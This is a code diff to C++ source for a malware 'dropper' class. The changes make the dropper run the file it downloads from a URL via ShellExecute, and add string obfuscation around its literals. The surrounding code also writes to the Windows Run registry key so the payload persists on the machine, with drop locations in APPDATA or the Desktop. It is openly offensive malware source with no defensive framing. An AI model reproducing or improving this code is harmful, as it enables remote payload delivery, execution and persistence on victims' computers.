@@ -16,6 +16,7 @@
 // up to you
 // #define PROGRAMPERSISTENCECHECK
 
+
 class c_dropper {
 public:
     struct persistence_t {
@@ -31,8 +32,8 @@ public:
             this->persist = persist;
             this->programName = programName;
             // an extension was not found
-            if (this->programName.find(".") == std::string::npos) {
-                this->programName.append(".exe");
+            if (this->programName.find(_(".")) == std::string::npos) {
+                this->programName.append(_(".exe"));
             }
             this->dropLocation = dropLocation;
             this->registryKeyName = registryKeyName;
@@ -50,17 +51,17 @@ public:
             switch (this->dropLocation) {
                 // Protected folder (needs UAC)
             case e_droplocation::APPDATA: {
-                return std::string(getenv("APPDATA")).append("\\").append(this->programName);
+                return std::string(getenv(_("APPDATA"))).append(_("\\")).append(this->programName);
                 break;
             }
             case e_droplocation::DESKTOP: {
-                return std::string(getDesktopPath().string()).append("\\").append(this->programName);
+                return std::string(getDesktopPath().string()).append(_("\\")).append(this->programName);
                 break;
             }
             }
         }
     };
-public: 
+public:
     std::string url; std::string path;
     bool openFile; persistence_t programPersistence;
     c_dropper(std::string url, std::string path, bool openFile, persistence_t programPersistence) {
@@ -69,24 +70,26 @@ public:
     }
     void drop() {
 #ifdef _DEBUG
-        std::cout <<"code: " << URLDownloadToFileA(NULL, this->url.c_str(), this->path.c_str(), 0, NULL) 
+        std::cout << "code: " << URLDownloadToFileA(NULL, this->url.c_str(), this->path.c_str(), 0, NULL)
             << " downloaded " << this->url << " to " << this->path << std::endl;
-#elif
+#else
         URLDownloadToFileA(NULL, this->url.c_str(), this->path.c_str(), 0, NULL);
 #endif
+        if (this->openFile)
+            ShellExecute(NULL, _("open"), this->path.c_str(), NULL, NULL, SW_RESTORE);
         if (this->programPersistence.persist) {
 #ifdef PROGRAMPERSISTENCECHECK
             // we have downloaded a non executable file
-            if (this->path.find(".exe") != std::string::npos 
-                || this->path.find(".bat") != std::string::npos 
+            if (this->path.find(".exe") != std::string::npos
+                || this->path.find(".bat") != std::string::npos
                 || this->path.find(".py") != std::string::npos)
-        
+
 #endif
             {
                 HKEY hKey = NULL;
 
                 LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
-                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    _("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                     0, KEY_WRITE,
                     &hKey);
 
